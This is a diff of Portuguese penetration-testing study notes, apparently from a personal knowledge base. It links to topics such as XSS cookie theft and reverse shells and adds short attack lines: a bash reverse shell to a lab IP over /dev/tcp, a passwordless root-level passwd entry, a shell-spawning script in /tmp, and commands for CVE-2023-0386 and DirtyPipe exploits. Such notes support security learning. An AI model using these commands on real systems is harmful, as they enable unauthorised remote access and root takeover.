@@ -1,20 +1,12 @@
+[[Cyber - Type Confusion]]
+[[Cyber - Exploiting XSS-stealing cookies]]
+
 Esteganografia
+SSRF
+Path hijacking
 
+[[Cyber - Reverse Shell]]
 
----
-### Reverse Shell
-[[Cyber - Reverse Shell na mão]]
-
-```sh
-script -qc /bin/bash /dev/null
-```
-Quando nos conectamos, o shell não é muito explícito, com esse comando ele fica mais completo.
-
-#### Sites de reverse shell
-- **`Gerador`** : https://www.revshells.com/
-- **`Melhorzin`** : https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python
-- https://r.0x7359.com/10.0.20.5:1337
-- https://www.youtube.com/watch?v=ljyXvn23BkM
 
 ---
 Elastic Search
@@ -26,6 +18,21 @@ Wazuh
 
 ---
 
-https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
+echo -e '#!/bin/bash\n/bin/bash' > /tmp/initdb.sh
 
-**winpeas.exe** is a script that will search for all possible paths to escalate privileges on Windows hosts.
+Criar um usuário sem senha e com a shell do root : root4::0:0:root4:/root:/bin/bash
+
+Fazer conexão remota : bash -i >& /dev/tcp/10.10.14.4/1234 0>&1
+
+---
+
+site de hashes : https://gchq.github.io/CyberChef/
+
+---
+
+https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits?tab=readme-ov-file
+
+---
+https://github.com/xkaneiki/CVE-2023-0386
+./fuse ./ovlcap/lower ./gc &
+./exp
